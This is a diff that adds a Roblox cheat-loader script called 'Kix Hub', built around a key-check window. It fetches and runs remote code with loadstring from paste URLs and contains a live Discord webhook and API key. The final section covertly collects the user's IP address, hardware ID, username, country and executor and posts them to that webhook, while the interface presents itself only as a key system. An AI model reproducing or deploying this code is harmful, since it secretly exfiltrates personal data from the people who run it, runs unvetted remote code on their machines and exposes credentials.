@@ -1,0 +1,159 @@
+local UILibrary = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
+local Library = "https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/refs/heads/main/library/LuaLib/ROBLOX/PandaSVALLib.lua"
+local PandaAuth = loadstring(game:HttpGet(Library))()
+PandaAuth:Initialize({ 
+    Service = "InfiniteWare", 
+    API_Key = "5496ff40ea8d0afc517b00f17371e431784a7684375686d78dceec1eed88f5fe",
+    DisplayName = "Kix Hub🔥", 
+    IsDebug = true, 
+    Allow_BlacklistUsers = false, 
+    GUIVersion = false, 
+    EnableWebhook = true, 
+    Webhook_URL = "https://discord.com/api/webhooks/1324214931075366945/8NrMaOKu-_1FSyYnQ5umqwY9U4GhQszq4oOYIZOeCzbRoOMQRCPp8E8-Pcbcn_nK_1VE", 
+    Authenticated = function() print("Finally! You'll Still Be Logged Dumbass") end, 
+    NotAuthenticated = function() print("Logged For Not Getting Key Dumbass🤡.") end 
+}) 
+
+local SUPERSCUREDKEYLOL1913 
+
+function gamecheckr()
+    if game.PlaceId == 16732694052 then
+        loadstring(game:HttpGet("https://i.e-z.host/p/raw/hws39n9u59", true))()
+    elseif game.PlaceId == 4639625707 then
+        loadstring(game:HttpGet("https://i.e-z.host/p/raw/fqo8wgiz6b", true))()
+    end
+end
+
+local function Noti(text)
+    UILibrary:Notify{
+        Title = "Key System!!!",
+        Content = text,
+        Duration = 2
+    }
+end
+
+local Window = UILibrary:CreateWindow{
+    Title = "Key System",
+    SubTitle = "Kix Hub",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(745, 525),
+    Resize = true,
+    MinSize = Vector2.new(470, 380),
+    Acrylic = false,
+    Theme = "Viow Flat",
+    MinimizeKey = Enum.KeyCode.RightControl
+}
+
+local Tabs = {
+    Main = Window:CreateTab{
+        Title = "Main",
+        Icon = "key"
+    },
+}
+
+Tabs.Main:AddInput("", {
+    Title = "Enter Key",
+    Default = "Key Here",
+    Callback = function(Value)
+        SUPERSCUREDKEYLOL1913 = Value
+    end
+})
+
+Tabs.Main:CreateButton{
+    Title = "Check Key",
+    Callback = function()
+        if PandaAuth:ValidateKey(SUPERSCUREDKEYLOL1913) then
+            Noti("Valid Key\nPlease wait for a moment")
+            gamecheckr()
+        else 
+            Noti("Invalid Key Dumbass🔥")
+        end
+    end
+}
+
+Tabs.Main:CreateButton{
+    Title = "Get Key",
+    Callback = function()
+        setclipboard(PandaAuth:GetKey())
+        Noti("Check Clipboard\nPaste to Browser")
+    end
+}
+
+Tabs.Main:CreateButton{
+    Title = "Join Discord",
+    Callback = function()
+        setclipboard("https://discord.gg/wwCuq3kGes")
+        Noti("Check Clipboard\nPaste to Browser")
+    end
+}
+Noti("Key System")
+
+Window:SelectTab(1)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
+
+local LocalPlayer = Players.LocalPlayer
+local UserId = LocalPlayer.UserId
+local DisplayName = LocalPlayer.DisplayName
+local Username = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+local Hwid = RbxAnalyticsService:GetClientId()
+local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local GameName = GameInfo.Name
+local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
+local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+local function detectExecutor()
+    return identifyexecutor() or "Unknown Executor"
+end
+
+local function createWebhookData()
+    return HttpService:JSONEncode({
+        username = "Logged",
+        avatar_url = "https://cdn.discordapp.com/icons/1288516472888365147/0f9c85e2751924b591e18ef562e3769e.png",
+        embeds = {
+            {
+                title = "🎮 Game Information",
+                description = "**[" .. GameName .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")**\n`ID: " .. game.PlaceId .. "`",
+                color = tonumber("0x2ecc71")
+            },
+            {
+                title = "👤 Player Information",
+                description = "**Display Name:** " .. DisplayName .. "\n**Username:** " .. Username .. "\n**User ID:** " .. UserId .. "\n**Membership:** " .. MembershipType .. "\n**Account Age:** " .. AccountAge .. " days\n**Platform:** " .. Platform .. "\n**Ping:** " .. Ping .. "ms",
+                color = tonumber("0x3498db")
+            },
+            {
+                title = "🌍 Location & Network",
+                description = "**IP:** `" .. GetIp .. "`\n**HWID:** `" .. Hwid .. "`\n**Country:** " .. GetData.country,
+                color = tonumber("0xe74c3c")
+            },
+            {
+                title = "⚙️ Technical Details",
+                description = "**Executor:** `" .. detectExecutor() .. "`",
+                color = tonumber("0x95a5a6"),
+                footer = { text = "📅 Date: " .. os.date("%m/%d/%Y") .. " | 🕒 Time: " .. os.date("%X") }
+            }
+        }
+    })
+end
+
+local function sendWebhook(webhookUrl, data)
+    local requestFunc = http_request or request or syn.request
+    if requestFunc then
+        requestFunc({Url = webhookUrl, Body = data, Method = "POST", Headers = {["Content-Type"] = "application/json"}})
+    else
+        warn("⚠️ Your executor does not support HTTP requests!")
+    end
+end
+
+sendWebhook("https://discord.com/api/webhooks/1324214931075366945/8NrMaOKu-_1FSyYnQ5umqwY9U4GhQszq4oOYIZOeCzbRoOMQRCPp8E8-Pcbcn_nK_1VE", createWebhookData())
